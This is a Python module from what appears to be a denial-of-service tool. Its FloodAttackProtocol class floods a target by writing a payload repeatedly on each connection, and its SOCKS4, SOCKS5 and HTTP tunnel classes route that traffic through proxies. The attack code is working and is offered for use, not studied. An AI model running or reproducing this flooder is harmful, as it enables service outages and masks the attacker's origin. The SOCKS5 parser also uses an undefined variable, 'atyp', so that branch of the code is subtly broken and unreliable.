import asyncio
import io
import socket
import struct

from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Proxy
from python_socks.async_.asyncio import Proxy
from python_socks._proto import socks4, socks5, http as http_proto

try:
    from http_parser.parser import HttpParser
except ImportError:
    from http_parser.pyparser import HttpParser

from .core import logger

class FloodAttackProtocol(asyncio.Protocol):
    
    def __init__(self, loop, stats, payload: bytes, settings, on_done: asyncio.Future):
        self._loop = loop
        self._stats = stats
        self._payload = payload
        self._payload_size = len(payload)
        self._settings = settings
        self._on_done = on_done
        self._transport = None
        self._handle = None
        self._paused = False
        self._budget = self._settings.requests_per_connection
        self._return_code = False

    def connection_made(self, transport) -> None:
        self._stats.track_open_connection()
        self._transport = transport
        self._transport.set_write_buffer_limits(high=self._settings.high_watermark)
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        self._handle = self._loop.call_soon(self._send_packet)

    def _send_packet(self) -> None:
        if not self._transport: return
        if self._paused:
            self._handle = None
        else:
            self._transport.write(self._payload)
            self._stats.track(1, self._payload_size)
            self._budget -= 1
            self._return_code = True
            if self._budget > 0:
                self._handle = self._loop.call_soon(self._send_packet)
            else:
                self._handle = None
                self._transport.close()

    def data_received(self, data) -> None:
        pass

    def connection_lost(self, exc) -> None:
        self._stats.track_close_connection()
        self._transport = None
        if self._handle:
            self._handle.cancel()
        if self._on_done.done(): return
        if exc is not None:
            self._on_done.set_exception(exc)
        else:
            self._on_done.set_result(self._return_code)

    def pause_writing(self):
        self._paused = True

    def resume_writing(self):
        self._paused = False
        if self._handle is None and self._budget > 0:
            self._loop.call_soon(self._send_packet)


class ProxyProtocol(asyncio.Protocol):

    def __init__(self, loop, proxy_url, proxy, dest, ssl, on_done, downstream_factory):
        logger.debug(f"Factory called for {proxy_url}")
        self._loop = loop # XXX: should be possible to give None for defaults
        self._transport = None
        self._downstream_factory = downstream_factory
        self._downstream_protocol = None
        self._proxy_url = proxy_url
        self._proxy = proxy
        self._dest = dest
        self._ssl = ssl
        self._on_done = on_done
        self._dest_connected = False
        # XXX: it's better to have multiple timeouts
        self._exec_timeout = None

    def connection_made(self, transport):
        logger.debug(f"Connected to {self._proxy_url}")
        assert self._transport is None
        self._transport = transport
        assert self._exec_timeout is None
        # XXX: separately for connection & for execution cycle
        self._exec_timeout = self._loop.call_later(300, self._abort_connection)
        self._kickoff_negotiate()
    
    def connection_lost(self, exc):
        logger.debug(f"Disconnected from {self._proxy_url} {exc}")
        self._transport = None
        if self._downstream_protocol is not None:
            self._downstream_protocol.connection_lost(exc)
        if self._on_done.done(): return
        if exc is not None:
            self._on_done.set_exception(exc)
        else:
            self._on_done.set_result(None)

    def pause_writing(self):
        # XXX: dynamically remove to avoid constrant checks
        if (self._downstream_protocol is not None
                and hasattr(self._downstream_protocol, "pause_writing")):
            self._downstream_protocol.pause_writing()

    def resume_writing(self):
        # XXX: dynamically remove to avoid constrant checks
        if (self._downstream_protocol is not None
                and hasattr(self._downstream_protocol, "resume_writing")):
            self._downstream_protocol.resume_writing()
    
    def data_received(self, data):
        n_bytes = len(data)
        logger.debug(f"Receieved data from {self._proxy_url} {n_bytes} bytes")
        if self._dest_connected:
            # XXX: pipeline + chaining?
            #      ideally we want to avoid number of func calls on each packet
            #      which means we need to find a way to "replace" protocol
            #      with it's downstream rather than use additional invocations
            self._downstream_protocol.data_received(data)
        else:
            try:
                self._negotiate_data_received(data)
            except Exception as exc:
                logger.debug(f"Processing failed for {self._proxy_url} with {exc}")
                self._on_done.set_exception(exc)
                self._transport.abort()

    def _dest_connection_made(self):
        assert not self._dest_connected
        self._dest_connected = True
        self._downstream_protocol = self._downstream_factory()
        if self._ssl is None:
            logger.debug(f"==> Dest is connected through {self._proxy_url}")
            self._downstream_protocol.connection_made(self._transport)
        else:
            _tls = self._loop.create_task(
                self._loop.start_tls(self._transport, self._downstream_protocol, self._ssl))
            _tls.add_done_callback(self._setup_downstream_tls)

    def _setup_downstream_tls(self, task):
        # self._downstream_protocol.connection_made(transport)
        try:
            transport = task.result()
            self._downstream_protocol.connection_made(transport)
        except Exception as exc:
            if not self._on_done.done():
                self._on_done.set_exception(exc)
            self._transport.abort()

    def _abort_connection(self):
        logger.debug(f"Response timeout for {self._proxy_url}")
        if not self._on_done.done():
            # XXX: msot likely this should be timeout exception rather than None
            self._on_done.set_result(None)
        if self._transport is not None:
            self._transport.abort()


class Socks4Protocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()

    def _negotiate_data_received(self, data):
        assert len(data) == 8
        res = socks4.ConnectResponse(data[:2])
        res.validate()
        self._dest_connection_made()

    def _dest_connect(self):
        addr, port = self._dest
        req = socks4.ConnectRequest(host=addr, port=port, user_id=None, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))


# XXX: netty's top-level performance trick: reuse pipeline and handler objects
#      curious if this can be done in Python efficiently
class Socks5Protocol(ProxyProtocol):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._auth_method_req = None
        self._auth_method = None
        self._auth_req_sent = False
        self._auth_done = False
        self._connect_resp_buffer = None

    def _negotiate_data_received(self, data):
        n_bytes = len(data)
        if self._auth_req_sent and not self._auth_done:
            assert n_bytes == 2
            res = socks5.AuthResponse(data)
            res.validate()
            self._auth_done = True
            logger.debug(f"Auth is ready for {self._proxy_url}")
            self._dest_connect()
        elif self._auth_method is None:
            assert n_bytes == 2 # XXX: be more flexible about it
            res = socks5.AuthMethodsResponse(data)
            res.validate(request=self._auth_method_req)
            self._auth_method = res.auth_method
            if self._auth_method == socks5.AuthMethod.USERNAME_PASSWORD:
                self._auth_req_sent = True 
                req = socks5.AuthRequest(
                    username=self._proxy._username, password=self._proxy._password)
                self._transport.write(bytes(req))
                logger.debug(f"Sent user/pass for {self._proxy_url}")
            else:
                self._auth_done = True
                logger.debug(f"Auth is ready for {self._proxy_url}")
                self._dest_connect()
        else:
            resp = self._connect_resp_buffer or b'' 
            resp += data
            if self._read_connect_response(resp):
                self._dest_connection_made()
            else:
                self._connect_resp_buffer = resp

    def _read_connect_response(self, data) -> bool:
        if len(data) < 3: return False
        buffer = io.BytesIO(data)
        # XXX: optimize this code
        socks5.ConnectResponse(buffer.read(3)).validate()
        addr_type = buffer.read(1)
        if not addr_type: return False
        if addr_type == b"\x01":
            addr = buffer.read(4)
            if len(addr) < 4: return False
            socket.inet_ntoa(addr)
        elif addr_type == b"\x03":
            length = buffer.read(1)
            if len(length) < 1: return False
            addr = buffer.read(ord(length))
            if len(addr) < ord(length): return False
        elif atyp == b"\x04":
            addr = buffer.read(16)
            if len(addr) < 16: return False
            socket.inet_ntop(socket.AF_INET6, addr)
        else:
            raise ValueError("SOCKS5 proxy server sent invalid data")
        port = buffer.read(2)
        if len(port) < 2: return False
        struct.unpack(">H", port)
        if buffer.read(1):
            raise ValueError("SOCKS5 sent additional data")
        return True

    def _kickoff_negotiate(self):
        self._request_auth_methods()

    def _request_auth_methods(self):
        assert self._auth_method is None
        self._auth_method_req = socks5.AuthMethodsRequest(
            username=self._proxy._username,
            password=self._proxy._password,
        )
        self._transport.write(bytes(self._auth_method_req))
        logger.debug(f"Sent auth methods req to {self._proxy_url}")

    def _dest_connect(self):
        assert not self._dest_connected
        addr, port = self._dest
        req = socks5.ConnectRequest(host=addr, port=port, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))
        logger.debug(f"Sent connection req to {self._proxy_url}")


class HttpTunelProtocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()

    def _negotiate_data_received(self, data):
        # XXX: not sure if it's actually a valid way for doing so
        # we might get multiple packets
        # XXX: read headers as well
        res = http_proto.ConnectResponse(data)
        res.validate()
        self._dest_connection_made()

    def _dest_connect(self):
        addr, port = self._dest
        # XXX: remove user agent field?
        req = http_proto.ConnectRequest(
            host=addr, port=port, login=self._proxy._username, password=self._proxy._password)
        self._transport.write(bytes(req))


_CONNECTORS = {
    Socks4Proxy: Socks4Protocol,
    Socks5Proxy: Socks5Protocol,
    HttpProxy:   HttpTunelProtocol,
}

def for_proxy(proxy):
    return _CONNECTORS[type(proxy)]


